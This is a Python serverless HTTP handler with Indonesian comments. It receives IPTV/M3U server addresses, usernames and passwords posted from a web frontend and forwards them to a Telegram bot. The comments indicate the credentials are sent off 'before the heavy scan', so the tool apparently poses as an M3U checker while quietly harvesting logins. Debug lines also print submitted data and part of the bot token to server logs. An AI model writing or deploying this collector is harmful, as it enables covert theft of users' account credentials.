import os
import json
import urllib.request
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def kirim_ke_telegram(pesan):
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
    
    # Poin 1: Debugger untuk mengecek apakah Env Var terbaca di log Vercel
    print(f"=== DEBUG TELEGRAM ===")
    print(f"DEBUG token ada: {bool(token)}")
    print(f"DEBUG chat_id ada: {bool(chat_id)}")
    print(f"DEBUG token (5 char pertama): {token[:5] if token else 'KOSONG'}")
    print(f"DEBUG chat_id: {chat_id if chat_id else 'KOSONG'}")

    if not token or not chat_id:
        print("ERROR: Token atau Chat ID tidak ditemukan!")
        return

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": pesan
    }
    
    try:
        req = urllib.request.Request(
            url,
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = resp.read().decode('utf-8')
            print(f"Telegram response sukses: {result}") 
    except Exception as e:
        print(f"Gagal mengirim ke Telegram (Periksa kembali token Anda): {e}")

class handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        # Poin 2A: Cek apakah do_POST dipanggil
        print("=== do_POST DIPANGGIL ===")

        # Poin 2B: Pembacaan Content-Length yang jauh lebih aman
        content_length = int(self.headers.get('Content-Length') or 0)
        print(f"DEBUG content_length: {content_length}")
        
        if content_length > 0:
            try:
                post_data = self.rfile.read(content_length).decode('utf-8')
                print(f"DEBUG post_data (200 char pertama): {post_data[:200]}")
            except Exception as e:
                print(f"Error membaca body: {e}")
                post_data = ""
        else:
            post_data = ""

        pesan = ""
        if post_data:
            try:
                data = json.loads(post_data)
                server   = data.get('host') or data.get('server') or '-'
                username = data.get('username') or data.get('usr') or '-'
                password = data.get('password') or data.get('pwd') or '-'
                
                pesan = (
                    f"LOG M3U MASUK\n\n"
                    f"Server  : {server}\n"
                    f"Username: {username}\n"
                    f"Password: {password}\n\n"
                    f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
                )
            except Exception:
                pesan = (
                    f"LOG M3U MASUK (raw text)\n\n"
                    f"{post_data}\n\n"
                    f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
                )

        # Poin 2C: Kirim ke Telegram di awal sebelum script melakukan scan berat
        if pesan:
            kirim_ke_telegram(pesan)

        # Response sukses balik ke Frontend Web
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
